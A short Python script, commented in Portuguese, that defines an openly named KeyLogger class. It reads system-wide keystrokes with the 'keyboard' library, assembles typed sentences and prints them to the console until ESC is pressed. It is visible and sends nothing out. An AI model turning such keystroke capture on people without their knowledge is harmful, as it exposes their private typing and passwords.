import keyboard
import string
import time


class KeyLogger:
    def __init__(self):
        self.sentences = []
        self.current_sentence = ""
        self.last_key_time = time.time()

        # Teclas que não devem ser incluídas nas frases
        self.ignored_keys = {
            "caps lock", "up", "left", "down", "right", "shift", "ctrl",
            "alt", "alt gr", "tab", "esc", "enter", "backspace"
        }

    def is_valid_key(self, key_event):
        """Filtra apenas as teclas que são imprimíveis e não ignoradas."""
        try:
            if key_event.name in self.ignored_keys:
                return False
            if len(key_event.name) == 1 and key_event.name in string.printable:
                return True
            return key_event.name == "space"
        except Exception:
            return False

    def process_key(self, key_event):
        """Processa um evento de tecla pressionada."""
        key_name = key_event.name

        if key_name == "backspace":
            self.current_sentence = self.current_sentence[:-1]
        elif key_name == "enter":
            if self.current_sentence:
                self.sentences.append(self.current_sentence)
                print(f"Frase registrada: {self.current_sentence}")
                self.current_sentence = ""
        elif key_name == "space":
            self.current_sentence += " "
        elif self.is_valid_key(key_event):
            self.current_sentence += key_name

        # Exibe a frase atual se passou um tempo desde a última tecla
        current_time = time.time()
        if current_time - self.last_key_time > 0.2:
            self.last_key_time = current_time
            if self.current_sentence:
                print("Frase atual:", self.current_sentence)
                if self.sentences:
                    print("Frases anteriores:", self.sentences)

    def start(self):
        print("Iniciando o monitoramento de teclas (pressione ESC para sair)...")
        try:
            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name == "esc":
                        print("Encerrando.")
                        break
                    self.process_key(event)
        except KeyboardInterrupt:
            print("Interrompido pelo usuário.")


if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
